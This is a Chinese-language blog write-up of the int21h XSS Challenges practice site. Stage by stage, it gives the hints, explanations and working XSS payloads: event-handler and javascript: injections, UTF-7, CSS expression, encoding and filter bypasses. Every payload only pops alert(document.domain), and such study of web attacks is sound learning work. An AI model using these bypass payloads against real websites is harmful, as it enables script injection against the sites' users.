---
title: "XSS Challenges Writeup"
date: 2018-08-01T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['ctf','xss']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


[xss-quiz.int21h.jp](http://xss-quiz.int21h.jp/)

最近在看余大的那本书, 干货满满, 就闲的蛋疼的去做了下这个 xss 挑战.

17关和18关的 Hint 为 `This stage works on only old version IE`, 然后我就跳过了.

19关的 Twitter DOM-XSS 按照网上的 payload 也没有复现成功, 不知道是不是浏览器的问题.

<!--more-->

## Stage 1

`Hint: very simple...`

没啥技术含量, 直接注入代码.

`<svg/onload=alert(document.domain)>`

## Stage 2

`Hint: close the current tag and add SCRIPT tag...`

输出是在 input 标签中的 value 里面, 先闭合掉再注入代码.

这题也能用 onmouseover 提交, 注意引号.

`"><svg/onload=alert(document.domain)>`

`1 onmouseover="alert(document.domain)`

## Stage 3

`Hint: The input in text box is properly escaped.`

p1 被过滤了, 抓包更改下 p2 就行.

`<svg/onload=alert(document.domain)>`

## Stage 4

`Hint: invisible input field`

查看源代码, 有个 hackme 参数, 抓包更改即可.

`<svg/onload=alert(document.domain)>`

## Stage 5

`Hint: length limited text box`

跟 `Stage 2` 一样.

审查元素更改 maxlength 或者抓包修改参数.

`"><svg/onload=alert(document.domain)>`

`1 onmouseover="alert(document.domain)`

## Stage 6

`Hint: event handler attributes`

尖括号被过滤了, 那就用 onmouseover.

还是要注意引号的闭合.

`" onmouseover="alert(document.domain)`

## Stage 7

`Hint: nearly the same... but a bit more tricky.`

这题跟上一题差不多, 不过参数间用的不是双引号, 直接就是空格.

`1 onmouseover=alert(document.domain)`

## Stage 8

`Hint: the 'javascript' scheme.`

提交后会生成 a 标签, href 为我们输入的参数.

javascript 伪协议.

`javascript:alert(document.domain)`

## Stage 9

`Hint: UTF-7 XSS`

这道题考的是 IE 浏览器遗留的 UTF-7 问题.

当 response 响应头的 Content-Type 未指定 charset 或为错误的 charset 时, IE 浏览器将返回页面中的编码当做 UTF-7 字符串执行.

```
<?php
header('Content-Type: text/html;charset=sb');
?>

+/v8 +ADw-script+AD4-alert(0)+ADw-/script+AD4-
```

IE 访问的时候就会执行弹窗.

以此类推, 题目实体化了尖括号, 引号等字符串, 那就能用 UTF-7 编码然后绕过后端的过滤.

查看源代码, 有个 charset 参数可控, 抓包的时候更改为 UTF-7.

这里好像不能直接输入 `document.domain`, 只能用编码, 记得 urlencode 一下.

`+/v8 +ACI- onmouseover=alert(d+AG8AYw-u+AG0-en+AHQALg-d+AG8AbQBh-in)+AD4-`

## Stage 10

`Hint: s/domain//g;`

测试的时候发现 domain 被替换为空, 但只进行了一次替换.

同样两种方法, on 事件和闭合标签.

`1" onmouseover="alert(document.ddomainomain)`

`"><svg/onload=alert(document.ddomainomain)>`

## Stage 11

`Hint: "s/script/xscript/ig;" and "s/on[a-z]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;"`

script 和 on 事件都被过滤了, 不过还是能用 a 标签.

本来想用 data 协议的, 后来发现并不能弹出 `document.domain` 的值.

浏览器会很神奇的把 tab 去除.

`<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:alert(document.domain)">click</a>`

## Stage 12

`Hint: "s/[\x00-\x20\<\>\"\']//g;"`

题目几乎过滤了所有能进行闭合的字符.

但源代码中的 value 是没有用引号括起来的, 只要找个功能类似于引号的字符就行.

简单 fuzz 一下发现并没有什么可利用的字符, 后来又在 IE 测试了一遍, 反引号能够替代引号闭合字符串.

```
``onmouseover=alert(document.domain);
```

## Stage 13

`Hint: style attribute`

css 的 xss, 两种方法, 第二种只能在 IE 下执行.

`background:url(javascript:alert(document.domain));`

`x:expression(alert(document.domain));`

## Stage 14

`Hint: s/(url|script|eval|expression)/xxx/ig;`

过滤了 url 和 expression, 能用 css 的注释绕过.

`background:ur/*xss*/l(javascript:alert(document.domain));`

`x:express/*xss*/ion(alert(document.domain));`

## Stage 15

`Hint: document.write();`

提交后发现尖括号等字符都被转义了, 查看源代码发现是调用 `document.write()` 进行输出.

注意这里是 JavaScript 的执行环境, 那就可以利用 JavaScript 的自解码机制去绕过.

用 `&#x;` 和 `&#;` 好像并不能执行, 换成了反斜杠, 但这里直接输入反斜杠会变成空, 改成 `//` 就行了.

`\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e`

## Stage 16

`Hint: "document.write();" and "s/\\x/\\\\x/ig;"`

这里用上一题的 payload 并不能成功执行.

编码成 unicode 即可绕过, 反斜杠同样要输入两次.

`\\u003cscript\\u003ealert(document.domain)\\u003c\\u002fscript\\u003e`

## Stage 17 Stage 18

这两题没做, 直接贴上余大的 payload 吧.

`Hint: multi-byte character`

```
euc-jp 的编码范围:
byte 1 为 8E 时, 为 2 byte 编码, byte 2 范围为 A1-DF
byte 1 范围为 A1-FE 时, 为 2 byte 编码, byte 2 范围为 A1-FE
byte 1 为 8F 时为 3 byte 编码, byte 2 与 byte 3 范围均为 A1-FE
两个表单元素都提交 %A7 闭合最后的双引号, 查看源码成功了, 为什么 UI 上去没成功? 无奈直接在地址栏: javascript:alert(document.domain);
现在发现原来是浏览器版本问题, 别用 IE8 了过这个.

```

`p1=1%A7&p2=+onmouseover%3Dalert%28document.domain%29%3B+%A7`

`Hint: us-ascii high bit issue`

```
41-5A, 61-7A (若含数字与符号, 则为 21-7E)
同样别用 IE8, 这些漏洞已经在 IE8 中修补了.
```

`p1=%A2%BE%BCscript%BEalert(document.domain);%BC/script%BE`

## Stage 19

`Hint: Twitter DOM-XSS`

payload

`#!javascript&#58;alert(document.domain);`

复现失败.